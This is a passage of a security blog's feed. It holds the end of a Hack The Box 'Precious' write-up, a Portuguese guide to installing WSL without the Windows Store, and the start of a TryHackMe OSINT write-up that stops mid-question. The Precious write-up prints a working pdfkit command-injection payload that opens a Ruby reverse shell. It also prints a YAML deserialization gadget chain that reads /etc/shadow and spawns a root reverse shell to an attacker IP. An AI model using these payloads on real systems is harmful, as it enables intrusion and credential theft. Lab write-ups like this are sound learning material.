</span></code></pre></div><p>Despite further enumeration with tools such as gobuster, nikto, and nmap using the vunls script, I couldn&rsquo;t identify any clear entry points.</p>
<p>Inspecting the source code of the page also yielded no significant insights.</p>
<p>The site offers a functionality to convert web addresses into PDF. I tried converting several random web pages, but as the target machine lacked internet access, all attempts failed. Subsequently, I initiated a local HTTP server using Python and attempted to convert a local URL.</p>

    <img src="/images/htb/precious/convert.png"  class="center"  style="border-radius: 10px;"  />


<p>The tool successfully converted my local URL into a PDF, which I then downloaded for analysis.</p>

    <img src="/images/htb/precious/exif.png"  class="center"  style="border-radius: 10px;"  />


<h2 id="exploit">Exploit</h2>
<p>Upon using the exiftool, I identified the underlying tool for this conversion as pdfkit v0.8.6. Researching this version led me to discover the vulnerability CVE-2022-25765 associated with it.</p>
<p>Exploiting this vulnerability was straightforward. After starting the local HTTP server again, I initiated a local port using netcat and dispatched the payload via curl.</p>
<p>The payload is as follows:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl <span style="color:#e6db74">&#39;TARGET-URL&#39;</span> -X POST -H <span style="color:#e6db74">&#39;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0&#39;</span> -H <span style="color:#e6db74">&#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8&#39;</span> -H <span style="color:#e6db74">&#39;Accept-Language: en-US,en;q=0.5&#39;</span> -H <span style="color:#e6db74">&#39;Accept-Encoding: gzip, deflate&#39;</span> -H <span style="color:#e6db74">&#39;Content-Type: application/x-www-form-urlencoded&#39;</span> -H <span style="color:#e6db74">&#39;Origin: TARGET_URL&#39;</span> -H <span style="color:#e6db74">&#39;Connection: keep-alive&#39;</span> -H <span style="color:#e6db74">&#39;Referer: TARGET_URL&#39;</span> -H <span style="color:#e6db74">&#39;Upgrade-Insecure-Requests: 1&#39;</span> --data-raw <span style="color:#e6db74">&#39;url=http%3A%2F%2FLOCAL-IP%3ALOCAL-HTTP-PORT%2F%3Fname%3D%2520%60+ruby+-rsocket+-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%22LOCAL-IP%22%2CLOCAL-LISTEN-PORT%29%29%27%60&#39;</span>
</code></pre></div>
    <img src="/images/htb/precious/shell.png"  class="center"  style="border-radius: 10px;"  />


<h2 id="local-enumeration">Local Enumeration</h2>
<p>Having obtained a shell, my immediate objective was to retrieve the user flag. Unfortunately, the user &lsquo;ruby&rsquo; lacked the necessary permissions to access the file.

    <img src="/images/htb/precious/permission.png"  class="center"  style="border-radius: 10px;"  />


Further manual enumeration revealed user credentials stored in the ruby home directory:

    <img src="/images/htb/precious/henry.png"  class="center"  style="border-radius: 10px;"  />

</p>
<h3 id="ssh">SSH</h3>
<p>Using the obtained credentials, I established an SSH connection to the machine and successfully accessed the user.txt flag:</p>

    <img src="/images/htb/precious/user.png"  class="center"  style="border-radius: 10px;"  />


<h2 id="privilege-escalation">Privilege Escalation</h2>
<p>Closer examination indicated that the user &lsquo;henry&rsquo; could execute /usr/bin/ruby /opt/update_dependencies.rb with sudo privileges:</p>

    <img src="/images/htb/precious/sudo.png"  class="center"  style="border-radius: 10px;"  />


<p>After attempting various methods to escalate to root and researching online, I identified a vulnerability associated with the YAML load file function deserialization present within the /opt/update_dependencies.rb file.</p>

    <img src="/images/htb/precious/dependencies.png"  class="center"  style="border-radius: 10px;"  />


<p>Executing this file with sudo privileges initially resulted in an error due to a missing dependencies.yml file. In response, I created the required file and embedded a Ruby payload.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#f92672">---</span>
<span style="color:#f92672">-</span> <span style="color:#f92672">!</span>ruby<span style="color:#f92672">/</span><span style="color:#e6db74">object</span>:<span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Installer</span>
    <span style="color:#e6db74">i</span>: x
<span style="color:#f92672">-</span> <span style="color:#f92672">!</span>ruby<span style="color:#f92672">/</span><span style="color:#e6db74">object</span>:<span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">SpecFetcher</span>
    <span style="color:#e6db74">i</span>: y
<span style="color:#f92672">-</span> <span style="color:#f92672">!</span>ruby<span style="color:#f92672">/</span><span style="color:#e6db74">object</span>:<span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Requirement</span>
  <span style="color:#e6db74">requirements</span>:
    <span style="color:#f92672">!</span>ruby<span style="color:#f92672">/</span><span style="color:#e6db74">object</span>:<span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Package</span><span style="color:#f92672">::</span><span style="color:#66d9ef">TarReader</span>
    <span style="color:#e6db74">io</span>: <span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">!</span>ruby<span style="color:#f92672">/</span><span style="color:#e6db74">object</span>:<span style="color:#66d9ef">Net</span><span style="color:#f92672">::</span><span style="color:#66d9ef">BufferedIO</span>
      <span style="color:#e6db74">io</span>: <span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">!</span>ruby<span style="color:#f92672">/</span><span style="color:#e6db74">object</span>:<span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Package</span><span style="color:#f92672">::</span><span style="color:#66d9ef">TarReader</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Entry</span>
         <span style="color:#e6db74">read</span>: <span style="color:#ae81ff">0</span>
         <span style="color:#e6db74">header</span>: <span style="color:#e6db74">&#34;abc&#34;</span>
      <span style="color:#e6db74">debug_output</span>: <span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">!</span>ruby<span style="color:#f92672">/</span><span style="color:#e6db74">object</span>:<span style="color:#66d9ef">Net</span><span style="color:#f92672">::</span><span style="color:#66d9ef">WriteAdapter</span>
         <span style="color:#e6db74">socket</span>: <span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">!</span>ruby<span style="color:#f92672">/</span><span style="color:#e6db74">object</span>:<span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">RequestSet</span>
             <span style="color:#e6db74">sets</span>: <span style="color:#f92672">!</span>ruby<span style="color:#f92672">/</span><span style="color:#e6db74">object</span>:<span style="color:#66d9ef">Net</span><span style="color:#f92672">::</span><span style="color:#66d9ef">WriteAdapter</span>
                 <span style="color:#e6db74">socket</span>: <span style="color:#f92672">!</span>ruby<span style="color:#f92672">/</span>module <span style="color:#e6db74">&#39;Kernel&#39;</span>
                 <span style="color:#e6db74">method_id</span>: <span style="color:#e6db74">:system</span>
             <span style="color:#e6db74">git_set</span>: cat <span style="color:#e6db74">/etc/s</span>hadow
         <span style="color:#e6db74">method_id</span>: <span style="color:#e6db74">:resolve</span>
</code></pre></div><p>I modified the payload to gain the necessary root permissions and utilized it to initiate a reverse shell session with elevated privileges.
Ultimately, with root access in hand, I accessed and read the flag located within the root directory.</p>

    <img src="/images/htb/precious/passwd.png"  class="center"  style="border-radius: 10px;"  />


<p>Having gained access to the passwd file, I surmised that there was a potential avenue for escalating privileges to root. Multiple strategies could be pursued at this juncture. I could have attempted to decrypt the shadow file or modify permissions in the root directory. However, I opted to initiate a reverse shell session with root privileges using a Ruby payload.</p>
<p>To facilitate this, I opened a port on my attacking machine and modified the payload to execute the reverse shell.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#f92672">---</span>
<span style="color:#f92672">-</span> <span style="color:#f92672">!</span>ruby<span style="color:#f92672">/</span><span style="color:#e6db74">object</span>:<span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Installer</span>
    <span style="color:#e6db74">i</span>: x
<span style="color:#f92672">-</span> <span style="color:#f92672">!</span>ruby<span style="color:#f92672">/</span><span style="color:#e6db74">object</span>:<span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">SpecFetcher</span>
    <span style="color:#e6db74">i</span>: y
<span style="color:#f92672">-</span> <span style="color:#f92672">!</span>ruby<span style="color:#f92672">/</span><span style="color:#e6db74">object</span>:<span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Requirement</span>
  <span style="color:#e6db74">requirements</span>:
    <span style="color:#f92672">!</span>ruby<span style="color:#f92672">/</span><span style="color:#e6db74">object</span>:<span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Package</span><span style="color:#f92672">::</span><span style="color:#66d9ef">TarReader</span>
    <span style="color:#e6db74">io</span>: <span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">!</span>ruby<span style="color:#f92672">/</span><span style="color:#e6db74">object</span>:<span style="color:#66d9ef">Net</span><span style="color:#f92672">::</span><span style="color:#66d9ef">BufferedIO</span>
      <span style="color:#e6db74">io</span>: <span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">!</span>ruby<span style="color:#f92672">/</span><span style="color:#e6db74">object</span>:<span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Package</span><span style="color:#f92672">::</span><span style="color:#66d9ef">TarReader</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Entry</span>
         <span style="color:#e6db74">read</span>: <span style="color:#ae81ff">0</span>
         <span style="color:#e6db74">header</span>: <span style="color:#e6db74">&#34;abc&#34;</span>
      <span style="color:#e6db74">debug_output</span>: <span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">!</span>ruby<span style="color:#f92672">/</span><span style="color:#e6db74">object</span>:<span style="color:#66d9ef">Net</span><span style="color:#f92672">::</span><span style="color:#66d9ef">WriteAdapter</span>
         <span style="color:#e6db74">socket</span>: <span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">!</span>ruby<span style="color:#f92672">/</span><span style="color:#e6db74">object</span>:<span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">RequestSet</span>
             <span style="color:#e6db74">sets</span>: <span style="color:#f92672">!</span>ruby<span style="color:#f92672">/</span><span style="color:#e6db74">object</span>:<span style="color:#66d9ef">Net</span><span style="color:#f92672">::</span><span style="color:#66d9ef">WriteAdapter</span>
                 <span style="color:#e6db74">socket</span>: <span style="color:#f92672">!</span>ruby<span style="color:#f92672">/</span>module <span style="color:#e6db74">&#39;Kernel&#39;</span>
                 <span style="color:#e6db74">method_id</span>: <span style="color:#e6db74">:system</span>
             <span style="color:#e6db74">git_set</span>: ruby <span style="color:#f92672">-</span>rsocket <span style="color:#f92672">-</span>e<span style="color:#e6db74">&#39;spawn(&#34;sh&#34;,[:in,:out,:err]=&gt;TCPSocket.new(&#34;10.10.16.35&#34;,9001))&#39;</span>
         <span style="color:#e6db74">method_id</span>: <span style="color:#e6db74">:resolve</span>
</code></pre></div><p>Upon obtaining root access, I successfully retrieved the flag from the root directory.</p>

    <img src="/images/htb/precious/root.png"  class="center"  style="border-radius: 10px;"  />



    <img src="/images/htb/precious/pwnd.png"  class="center"  style="border-radius: 10px;"  />


]]></content>
        </item>
        
        <item>
            <title>Instalando WSL sem Windows Store Pt-br</title>
            <link>https://nmmorette.github.io/posts/2022/12/instalando-wsl-sem-windows-store-pt-br/</link>
            <pubDate>Sat, 17 Dec 2022 00:00:00 +0000</pubDate>
            
            <guid>https://nmmorette.github.io/posts/2022/12/instalando-wsl-sem-windows-store-pt-br/</guid>
            <description>Talvez você se depare com a necessidade de instalar alguma instancia WSL em uma máquina windows onde a Windows Store não está disponível. Esse cenário pode acontecer em muitos ambientes corporativos, onde a loja é bloqueada devido a baselines de segurança ou por algum outro motivo.
Nesse caso é necessário seguir alguns passos para instalar o WSL e fazer o download das imagens de diferentes tipos de sistemas Linux.
Pré requisitos É necessário estar rodando Windows 10 versão 2004 ou superior ( Build 19041 ou maior), ou Windows 11.</description>
            <content type="html"><![CDATA[<p>Talvez você se depare com a necessidade de instalar alguma instancia WSL em uma máquina windows onde a Windows Store não está disponível. Esse cenário pode acontecer em muitos ambientes corporativos, onde a loja é bloqueada devido a baselines de segurança ou por algum outro motivo.</p>
<p>Nesse caso é necessário seguir alguns passos para instalar o WSL e fazer o download das imagens de diferentes tipos de sistemas Linux.</p>
<h2 id="pré-requisitos">Pré requisitos</h2>
<p>É necessário estar rodando Windows 10 versão 2004 ou superior ( Build 19041 ou maior), ou Windows 11. Se você está utilizando uma versão anterior, faça update do seu sistema.</p>
<h2 id="1---habilitando-o-wsl">1 - Habilitando o WSL</h2>
<p>Abra o PowerShell como <strong>administrador</strong> e digite o comando:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">dism.exe /online /enable-feature /featurename<span style="color:#960050;background-color:#1e0010">:</span>Microsoft-Windows-Subsystem-Linux /all /norestart
</code></pre></div><p>Esse comando vai habilitar os componentes necessários para o funcionamento do WSL.</p>
<h2 id="2---habilite-o-serviço-de-máquina-virtual">2 - Habilite o serviço de Máquina Virtual</h2>
<p>Depois de instalar o WSL, é preciso habilitar o serviço de Máquina Virtual do windows.
Com o Powershell aberto digite:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">dism.exe /online /enable-feature /featurename<span style="color:#960050;background-color:#1e0010">:</span>VirtualMachinePlatform /all /norestart
</code></pre></div><h2 id="3---download-do-pacote-linux-kernel-update">3 - Download do pacote Linux Kernel update</h2>
<p>Download da última versão:</p>
<p>• <a href="https://wslstorestorage.blob.core.windows.net/wslblob/wsl_update_x64.msi" target="_blank" >WSL2 Linux kernel update package for x64 machines</a></p>
<p>Após instalar o pacote de atualização siga para o próximo passo.</p>
<h2 id="4---configure-o-wsl-2-como-padrão">4 - Configure o WSL 2 como padrão</h2>
<p>Com o PowerShell aberto rode o comando abaixo para configurar o WSL 2 como o serviço padrão:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">wsl --set-default-version 2
</code></pre></div><h2 id="5---download-e-instalação-do-linux">5 - Download e Instalação do Linux</h2>
<p>Aqui é possível encontrar os links de download dos pacotes fora da Windows Store:</p>
<ul>
<li><a href="https://aka.ms/wslubuntu" target="_blank" >Ubuntu</a></li>
<li><a href="https://aka.ms/wslubuntu2204" target="_blank" >Ubuntu 22.04 LTS</a></li>
<li><a href="https://aka.ms/wslubuntu2004" target="_blank" >Ubuntu 20.04</a></li>
<li><a href="https://aka.ms/wslubuntu2004arm" target="_blank" >Ubuntu 20.04 ARM</a></li>
<li><a href="https://aka.ms/wsl-ubuntu-1804" target="_blank" >Ubuntu 18.04</a></li>
<li><a href="https://aka.ms/wsl-ubuntu-1804-arm" target="_blank" >Ubuntu 18.04 ARM</a></li>
<li><a href="https://aka.ms/wsl-ubuntu-1604" target="_blank" >Ubuntu 16.04</a></li>
<li><a href="https://aka.ms/wsl-debian-gnulinux" target="_blank" >Debian GNU/Linux</a></li>
<li><a href="https://aka.ms/wsl-kali-linux-new" target="_blank" >Kali Linux</a></li>
<li><a href="https://aka.ms/wsl-sles-12" target="_blank" >SUSE Linux Enterprise Server 12</a></li>
<li><a href="https://aka.ms/wsl-SUSELinuxEnterpriseServer15SP2" target="_blank" >SUSE Linux Enterprise Server 15 SP2</a></li>
<li><a href="https://aka.ms/wsl-SUSELinuxEnterpriseServer15SP3" target="_blank" >SUSE Linux Enterprise Server 15 SP3</a></li>
<li><a href="https://aka.ms/wsl-opensuse-tumbleweed" target="_blank" >openSUSE Tumbleweed</a></li>
<li><a href="https://aka.ms/wsl-opensuseleap15-3" target="_blank" >openSUSE Leap 15.3</a></li>
<li><a href="https://aka.ms/wsl-opensuseleap15-2" target="_blank" >openSUSE Leap 15.2</a></li>
<li><a href="https://aka.ms/wsl-oraclelinux-8-5" target="_blank" >Oracle Linux 8.5</a></li>
<li><a href="https://aka.ms/wsl-oraclelinux-7-9" target="_blank" >Oracle Linux 7.9</a></li>
<li><a href="https://github.com/WhitewaterFoundry/WSLFedoraRemix/releases/" target="_blank" >Fedora Remix for WSL</a></li>
</ul>
<p>Escolha a versão que deseja, faça o download e salve o arquivo com extensão <code>.appx</code></p>
<p>Se você preferir, você também pode fazer o download da distribuição via linha de comando utilizando Powershell com <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest" target="_blank" >Invoke-WebRequest</a>. Nesse caso, download do Ubuntu 20.04:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Invoke-WebRequest -Uri https<span style="color:#960050;background-color:#1e0010">:</span>//aka.ms/wslubuntu2004 -OutFile Ubuntu.appx -UseBasicParsing
</code></pre></div><p>Também é possível fazer o download via <code>curl.exe</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">curl.exe -L -o ubuntu-2004.appx https<span style="color:#960050;background-color:#1e0010">:</span>//aka.ms/wslubuntu2004
</code></pre></div><p>Após o download do pacote, é preciso fazer a instalação do mesmo com o comando <code>Add-AppxPackage</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Add-AppxPackage .\app_name.appx
</code></pre></div><p>Mude  <code>.\app_name.appx</code> para o nome do pacote que foi feito download.</p>
<h2 id="6---instalação-do-windows-terminal-opcional">6 - Instalação do Windows Terminal (opcional)</h2>
<p>Utilizando o Windows Terminal você tem opção de abrir múltiplas abas com suas diferentes versões do Linux instaladas.</p>
<p>
    <img src="/images/wsl/Untitled.png"  class="center"  style="border-radius: 10px;"  />


<a href="https://apps.microsoft.com/store/detail/windows-terminal/9N0DX20HK701?hl=pt-br&amp;gl=br" target="_blank" >Download do Windows Terminal</a></p>
<h3 id="61---instalação-sem-windows-store">6.1 - Instalação sem Windows Store</h3>
<p>Partindo do princípio que não temos acesso a Windows Store, o link acima não vai funcionar, portanto é preciso fazer a instalação manual.</p>
<p>Faça o download do arquivo <code>.msixbundle</code> <a href="https://github.com/microsoft/terminal/releases" target="_blank" >aqui</a>.</p>

    <img src="/images/wsl/Untitled%201.png"  class="center"  style="border-radius: 10px;"  />


<p>Abra o Powershell como administrador e vá até a pasta onde o arquivo foi salvo.
0
Rode o comando de instalação:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Add-AppxPackage Microsoft.WindowsTerminalPreview_Win10_1.16.2641.0_8wekyb3d8bbwe.msixbundle
</code></pre></div><p>⚠️ Atente-se ao nome do arquivo, a versão baixada pode ser difetente.</p>

    <img src="/images/wsl/Untitled%202.png"  class="center"  style="border-radius: 10px;"  />


<p>O <code>Windows Terminal</code>foi instalado.</p>

    <img src="/images/wsl/Untitled%203.png"  class="center"  style="border-radius: 10px;"  />


]]></content>
        </item>
        
        <item>
            <title>TryHackme - OhSINT - Write-Up</title>
            <link>https://nmmorette.github.io/posts/2022/08/tryhackme-ohsint-write-up/</link>
            <pubDate>Wed, 24 Aug 2022 00:00:00 +0000</pubDate>
            
            <guid>https://nmmorette.github.io/posts/2022/08/tryhackme-ohsint-write-up/</guid>
            <description>OhSINT - TryHackMe  What information can you possible get with just one photo?
 First step is download the file and open it.
A nostalgic Wallpaper
Using exiftool to check some attributes:
exiftool WindowsXP.jpg ExifTool Version Number : 12.65 File Name : WindowsXP.jpg Directory : . File Size : 234 kB File Modification Date/Time : 2023:09:26 18:33:44-04:00 File Access Date/Time : 2023:09:26 18:33:49-04:00 File Inode Change Date/Time : 2023:09:26 18:33:48-04:00 File Permissions : -rwxrw-rw- File Type : JPEG File Type Extension : jpg MIME Type : image/jpeg XMP Toolkit : Image::ExifTool 11.</description>
            <content type="html"><![CDATA[<h1 id="ohsint---tryhackme">OhSINT - TryHackMe</h1>

    <img src="/images/OhSINT/Untitled.png"  class="center"  style="border-radius: 10px;"  />


<blockquote>
<p>What information can you possible get with just one photo?</p>
</blockquote>
<p>First step is download the file and open it.</p>

    <img src="/images/OhSINT/Untitled%201.png"  class="center"  style="border-radius: 10px;"  />


<p>A nostalgic Wallpaper</p>
<p>Using exiftool to check some attributes:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-jsx" data-lang="jsx"><span style="color:#a6e22e">exiftool</span> <span style="color:#a6e22e">WindowsXP</span>.<span style="color:#a6e22e">jpg</span> 
<span style="color:#a6e22e">ExifTool</span> <span style="color:#a6e22e">Version</span> Number         <span style="color:#f92672">:</span> <span style="color:#ae81ff">12.65</span>
<span style="color:#a6e22e">File</span> <span style="color:#a6e22e">Name</span>                       <span style="color:#f92672">:</span> <span style="color:#a6e22e">WindowsXP</span>.<span style="color:#a6e22e">jpg</span>
<span style="color:#a6e22e">Directory</span>                       <span style="color:#f92672">:</span> .
<span style="color:#a6e22e">File</span> <span style="color:#a6e22e">Size</span>                       <span style="color:#f92672">:</span> <span style="color:#ae81ff">234</span> <span style="color:#a6e22e">kB</span>
<span style="color:#a6e22e">File</span> <span style="color:#a6e22e">Modification</span> Date<span style="color:#f92672">/</span><span style="color:#a6e22e">Time</span>     <span style="color:#f92672">:</span> <span style="color:#ae81ff">2023</span><span style="color:#f92672">:</span><span style="color:#ae81ff">09</span><span style="color:#f92672">:</span><span style="color:#ae81ff">26</span> <span style="color:#ae81ff">18</span><span style="color:#f92672">:</span><span style="color:#ae81ff">33</span><span style="color:#f92672">:</span><span style="color:#ae81ff">44</span><span style="color:#f92672">-</span><span style="color:#ae81ff">04</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span>
<span style="color:#a6e22e">File</span> <span style="color:#a6e22e">Access</span> Date<span style="color:#f92672">/</span><span style="color:#a6e22e">Time</span>           <span style="color:#f92672">:</span> <span style="color:#ae81ff">2023</span><span style="color:#f92672">:</span><span style="color:#ae81ff">09</span><span style="color:#f92672">:</span><span style="color:#ae81ff">26</span> <span style="color:#ae81ff">18</span><span style="color:#f92672">:</span><span style="color:#ae81ff">33</span><span style="color:#f92672">:</span><span style="color:#ae81ff">49</span><span style="color:#f92672">-</span><span style="color:#ae81ff">04</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span>
<span style="color:#a6e22e">File</span> <span style="color:#a6e22e">Inode</span> <span style="color:#a6e22e">Change</span> Date<span style="color:#f92672">/</span><span style="color:#a6e22e">Time</span>     <span style="color:#f92672">:</span> <span style="color:#ae81ff">2023</span><span style="color:#f92672">:</span><span style="color:#ae81ff">09</span><span style="color:#f92672">:</span><span style="color:#ae81ff">26</span> <span style="color:#ae81ff">18</span><span style="color:#f92672">:</span><span style="color:#ae81ff">33</span><span style="color:#f92672">:</span><span style="color:#ae81ff">48</span><span style="color:#f92672">-</span><span style="color:#ae81ff">04</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span>
<span style="color:#a6e22e">File</span> <span style="color:#a6e22e">Permissions</span>                <span style="color:#f92672">:</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">rwxrw</span><span style="color:#f92672">-</span><span style="color:#a6e22e">rw</span><span style="color:#f92672">-</span>
<span style="color:#a6e22e">File</span> <span style="color:#a6e22e">Type</span>                       <span style="color:#f92672">:</span> <span style="color:#a6e22e">JPEG</span>
<span style="color:#a6e22e">File</span> <span style="color:#a6e22e">Type</span> <span style="color:#a6e22e">Extension</span>             <span style="color:#f92672">:</span> <span style="color:#a6e22e">jpg</span>
<span style="color:#a6e22e">MIME</span> <span style="color:#a6e22e">Type</span>                       <span style="color:#f92672">:</span> <span style="color:#a6e22e">image</span><span style="color:#f92672">/</span><span style="color:#a6e22e">jpeg</span>
<span style="color:#a6e22e">XMP</span> <span style="color:#a6e22e">Toolkit</span>                     <span style="color:#f92672">:</span> <span style="color:#a6e22e">Image</span><span style="color:#f92672">::</span><span style="color:#a6e22e">ExifTool</span> <span style="color:#ae81ff">11.27</span>
<span style="color:#a6e22e">GPS</span> <span style="color:#a6e22e">Latitude</span>                    <span style="color:#f92672">:</span> <span style="color:#ae81ff">54</span> <span style="color:#a6e22e">deg</span> <span style="color:#ae81ff">17</span><span style="color:#e6db74">&#39; 41.27&#34; N
</span><span style="color:#e6db74">GPS Longitude                   : 2 deg 15&#39;</span> <span style="color:#ae81ff">1.33</span><span style="color:#e6db74">&#34; W
</span><span style="color:#e6db74">Copyright                       : OWoodflint
</span><span style="color:#e6db74">Image Width                     : 1920
</span><span style="color:#e6db74">Image Height                    : 1080
</span><span style="color:#e6db74">Encoding Process                : Baseline DCT, Huffman coding
</span><span style="color:#e6db74">Bits Per Sample                 : 8
</span><span style="color:#e6db74">Color Components                : 3
</span><span style="color:#e6db74">Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
</span><span style="color:#e6db74">Image Size                      : 1920x1080
</span><span style="color:#e6db74">Megapixels                      : 2.1
</span><span style="color:#e6db74">GPS Latitude Ref                : North
</span><span style="color:#e6db74">GPS Longitude Ref               : West
</span><span style="color:#e6db74">GPS Position                    : 54 deg 17&#39; 41.27&#34;</span> <span style="color:#a6e22e">N</span>, <span style="color:#ae81ff">2</span> <span style="color:#a6e22e">deg</span> <span style="color:#ae81ff">15</span><span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#ae81ff">1.33</span><span style="color:#960050;background-color:#1e0010">&#34;</span> <span style="color:#a6e22e">W</span>
</code></pre></div><p><strong>Firstly</strong> in the <code>Copyright</code> section there’s a name, this could be a person or who owns the right of this photo. Then I Google it: <code>OWoodflint</code> and found some good results, such as  github, twitter and a wordpress blog.</p>
<p>After opening Twitter I found the answer for the first question:</p>

    <img src="/images/OhSINT/Untitled%202.png"  class="center"  style="border-radius: 10px;"  />


<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-jsx" data-lang="jsx"><span style="color:#a6e22e">Q1</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">What</span> <span style="color:#a6e22e">is</span> <span style="color:#66d9ef">this</span> <span style="color:#a6e22e">users</span> <span style="color:#a6e22e">avator</span> <span style="color:#66d9ef">of</span> <span style="color:#f92672">?</span>
<span style="color:#a6e22e">Ans</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">Cat</span>
</code></pre></div><p>Looking further there is another lead, a BSSID, wich could give us a location.

    <img src="/images/OhSINT/Untitled%203.png"  class="center"  style="border-radius: 10px;"  />

</p>
<blockquote>
<p><em>BSSID means the unique MAC Address of a WAP (Wireless Access Point). WAP is the device that works as a base for other devices to connect to it wirelessly. For example, in your home the phones and laptops are connected to the router wirelessly. This router is a WAP and the MAC Address this router has is BSSID. The name of the Wifi Network is called SSID.</em></p>
</blockquote>
<p>Now with the <strong>BSSID,</strong> I can use <code>[geowifi.py](http://geowifi.py)</code> search for a location:</p>
<p><a href="https://github.com/GONZOsint/geowifi" target="_blank" >https://github.com/GONZOsint/geowifi</a>

    <img src="/images/OhSINT/Untitled%204.png"  class="center"  style="border-radius: 10px;"  />

</p>
<p>Now with the coordinates, just put on google en discovery the answer to the second question.

    <img src="/images/OhSINT/Untitled%205.png"  class="center"  style="border-radius: 10px;"  />

</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-jsx" data-lang="jsx"><span style="color:#a6e22e">Q2</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">What</span> <span style="color:#a6e22e">city</span> <span style="color:#a6e22e">is</span> <span style="color:#66d9ef">this</span> <span style="color:#a6e22e">person</span> <span style="color:#66d9ef">in</span> <span style="color:#f92672">?</span>
<span style="color:#a6e22e">Ans</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">London</span>
</code></pre></div><p>Now we need to find the SSID of the WAP he connected, we could use <code>wigle.net</code></p>
<p><a href="https://wigle.net/" target="_blank" >WiGLE: Wireless Network Mapping</a></p>
<p>Just enter the approximate latitude and longitude of the region and the BSSID

    <img src="/images/OhSINT/Untitled%206.png"  class="center"  style="border-radius: 10px;"  />

</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-jsx" data-lang="jsx"><span style="color:#a6e22e">Q3</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">Whats</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">SSID</span> <span style="color:#66d9ef">of</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">WAP</span> <span style="color:#a6e22e">he</span> <span style="color:#a6e22e">connected</span> <span style="color:#a6e22e">to</span><span style="color:#f92672">?</span>
